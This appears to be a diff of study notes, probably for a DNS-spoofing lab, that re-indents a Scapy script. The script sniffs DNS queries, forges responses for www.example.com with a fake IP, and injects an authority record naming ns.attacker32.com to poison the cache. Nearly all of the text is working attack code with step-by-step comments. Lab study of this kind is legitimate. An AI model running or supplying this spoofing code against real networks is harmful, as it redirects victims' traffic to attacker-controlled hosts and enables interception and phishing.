@@ -80,81 +80,83 @@ If domain matches target:
 
  
     from scapy.all import *
-        def spoof_dns(pkt):
+
+    def spoof_dns(pkt):
         # Step 1: Check if packet contains DNS query
         if DNS in pkt and pkt[DNS].qd is not None:
         qname = pkt[DNS].qd.qname.decode()
-        # Step 2: Target specific domain
-        if "www.example.com" in qname:
-            print("[*] Spoofing:", qname)
 
-            # -------------------------------
-            # Step 3: Fake IP header
-            # -------------------------------
-            IPpkt = IP(
-                dst=pkt[IP].src,   # send back to victim
-                src=pkt[IP].dst    # pretend to be DNS server
-            )
+            # Step 2: Target specific domain
+            if "www.example.com" in qname:
+                print("[*] Spoofing:", qname)
 
-            # -------------------------------
-            # Step 4: Fake UDP header
-            # -------------------------------
-            UDPpkt = UDP(
-                dport=pkt[UDP].sport,  # victim port
-                sport=53               # DNS port
-            )
+                # -------------------------------
+                # Step 3: Fake IP header
+                # -------------------------------
+                IPpkt = IP(
+                    dst=pkt[IP].src,   # send back to victim
+                    src=pkt[IP].dst    # pretend to be DNS server
+                )
 
-            # -------------------------------
-            # Step 5: Fake Answer (IP)
-            # -------------------------------
-            Anssec = DNSRR(
-                rrname=pkt[DNS].qd.qname,
-                type='A',
-                rdata='1.2.3.4',   # fake IP
-                ttl=259200
-            )
+                # -------------------------------
+                # Step 4: Fake UDP header
+                # -------------------------------
+                UDPpkt = UDP(
+                    dport=pkt[UDP].sport,  # victim port
+                    sport=53               # DNS port
+                )
 
-            # -------------------------------
-            # Step 6: Authority Section (Poisoning)
-            # -------------------------------
-            NSsec = DNSRR(
-                rrname="example.com",
-                type='NS',
-                rdata='ns.attacker32.com',
-                ttl=259200
-            )
+                # -------------------------------
+                # Step 5: Fake Answer (IP)
+                # -------------------------------
+                Anssec = DNSRR(
+                    rrname=pkt[DNS].qd.qname,
+                    type='A',
+                    rdata='1.2.3.4',   # fake IP
+                    ttl=259200
+                )
 
-            # -------------------------------
-            # Step 7: Build DNS Response
-            # -------------------------------
-            DNSpkt = DNS(
-                id=pkt[DNS].id,  # must match request
-                qr=1,            # response
-                aa=1,            # authoritative
-                rd=0,
+                # -------------------------------
+                # Step 6: Authority Section (Poisoning)
+                # -------------------------------
+                NSsec = DNSRR(
+                    rrname="example.com",
+                    type='NS',
+                    rdata='ns.attacker32.com',
+                    ttl=259200
+                )
 
-                qd=pkt[DNS].qd,
-                qdcount=1,
-                ancount=1,
-                nscount=1,
+                # -------------------------------
+                # Step 7: Build DNS Response
+                # -------------------------------
+                DNSpkt = DNS(
+                    id=pkt[DNS].id,  # must match request
+                    qr=1,            # response
+                    aa=1,            # authoritative
+                    rd=0,
 
-                an=Anssec,
-                ns=NSsec
-            )
+                    qd=pkt[DNS].qd,
+                    qdcount=1,
+                    ancount=1,
+                    nscount=1,
 
-            # Step 8: Combine full packet
-            spoofpkt = IPpkt / UDPpkt / DNSpkt
+                    an=Anssec,
+                    ns=NSsec
+                )
 
-            # Step 9: Send fake response
-            send(spoofpkt, verbose=0)
+                # Step 8: Combine full packet
+                spoofpkt = IPpkt / UDPpkt / DNSpkt
+
+                # Step 9: Send fake response
+                send(spoofpkt, verbose=0)
 
 
-Step 10: Sniff DNS traffic
-sniff(
-    filter="udp port 53",
-    prn=spoof_dns,
-    store=0
-)
+    Step 10: Sniff DNS traffic
+    sniff(
+        filter="udp port 53",
+        prn=spoof_dns,
+        store=0
+    )
 
 ---
 
